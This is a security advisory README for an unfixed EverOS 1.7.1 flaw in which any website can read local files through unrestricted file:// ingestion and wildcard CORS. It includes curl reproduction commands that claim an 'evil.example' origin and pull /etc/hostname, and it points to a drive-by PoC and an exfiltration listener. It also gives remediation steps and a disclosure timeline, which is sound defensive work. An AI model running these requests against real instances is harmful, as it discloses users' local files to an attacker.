# EverOS — Local File Exfiltration via `file://` + Permissive CORS

**Any website can read arbitrary local files from a machine running EverOS — no authentication, no user interaction beyond visiting a page.**

Two insecure defaults combine into browser-mediated local file disclosure in EverOS 1.7.1 (Python/FastAPI, `EverMind-AI/EverOS`):

1. **`file://` ingestion is unrestricted.** `file_uri_allow_dirs` defaults to `[]`, which the code treats as "allow any readable file" (up to 50 MB/item).
2. **CORS allows everything.** The unauthenticated API defaults to `allow_origins=["*"]` + `allow_credentials=True`.

A victim's browser ingests `file:///etc/hostname` via `POST /api/v2/memory/add`, then reads the parsed content back via `POST /api/v2/memory/search` — all cross-origin. Demonstrated end-to-end in headless Chromium.

| | |
|---|---|
| **Severity** | High — CVSS 3.1 **8.2** `AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N` |
| **CWE** | CWE-73, CWE-942, CWE-306 (contributing) |
| **Affected** | EverOS 1.7.1 `e5778ed` … main HEAD `6ac3898` — **unfixed** |
| **Prerequisite** | `[multimodal]` parser configured; victim visits attacker page |
| **Disclosure** | Vendor notified 2026-11-20 · VulnCheck `31e5306f-1a5c-4489-b142-4097d39c9af9` · Vulners CNA emailed 2026-11-24 |
| **Reporter** | Teycir — analysis LLM-assisted, PoC executed and verified manually |

## Findings index

| ID | Finding | CVSS | Status |
|---|---|---|---|
| **2026-01** | This report — file:// exfiltration via CORS | **8.2** | Submitted (VulnCheck + Vulners) |
| 2026-02 | Unauthenticated SSRF via `uri` items | 7.4 | Draft ready, pending vendor contact |
| 2026-03 | Knowledge doc IDOR — tenant scope ignored | 6.8 | Draft ready, pending vendor contact |

Full audit: [`audit-2026-11-24/`](audit-2026-11-24/report.md) — report, evidence, PoCs, `SHA256SUMS`.
Submission drafts: [`submission/`](submission/).

## Reproduce in 30 seconds

```bash
# 1. Victim's browser-equivalent requests (cross-origin headers shown)
curl -X POST http://127.0.0.1:18777/api/v2/memory/add \
  -H 'Content-Type: application/json' -H 'Origin: https://evil.example' \
  -d '{"session_id":"poc","messages":[{"sender_id":"u1","role":"user","timestamp":1,"content":[{"type":"doc","name":"h.txt","uri":"file:///etc/hostname","ext":"txt"}]}],"defer_extraction":true}'

curl -X POST http://127.0.0.1:18777/api/v2/memory/search \
  -H 'Content-Type: application/json' -H 'Origin: https://evil.example' \
  -d '{"session_id":"poc","user_id":"attacker","query":"hostname"}'
# → data.unprocessed_messages[0].content[0].parsed_content == "<hostname>\n"
```

Browser drive-by PoC: [`poc/`](poc/) — `driveby.html`, `exfil_listener.py`, `browser_driveby.sh`.
Full write-up with captures and negative controls: [`report.md`](report.md).

## Why it works

```
attacker page ──CORS * + credentials──▶ EverOS API (no auth)
                                          │ file:///etc/passwd
                                          ▼
                                    parsed_content ──▶ /memory/search ──▶ attacker
```

- CORS middleware reflects any `Origin` and returns `Access-Control-Allow-Credentials: true`.
- `input.py` skips the allowlist check entirely when `file_uri_allow_dirs` is empty.
- Search does not bind `session_id` to `user_id` — the session ID is the only access control.

Negative controls verified: allowlist configured → symlink escape, `..` traversal, `file://localhost/` all rejected; unreadable files (`/etc/shadow`) error without leaking content.

## Remediation

- Default `file_uri_allow_dirs` to deny-all when unset; resolve symlinks before the check.
- Default CORS to no origins and `allow_credentials=False`.
- Add per-instance bearer-token auth on all API routes — loopback binding is not authorization.
- Return content references, not `parsed_content`/bytes, in search/list responses.
- Reject `Origin: null` and non-allowlisted origins before routing.

## Disclosure timeline

| Date (UTC) | Event |
|---|---|
| 2026-11-20 | Vendor notice → `evermind@shanda.com` (evidence zip `fd739c25…`) |
| 2026-11-23/24 | Re-verified unfixed at HEAD `6ac3898` |
| 2026-11-24 | VulnCheck submitted (case above) · Vulners CNA emailed · second audit added |
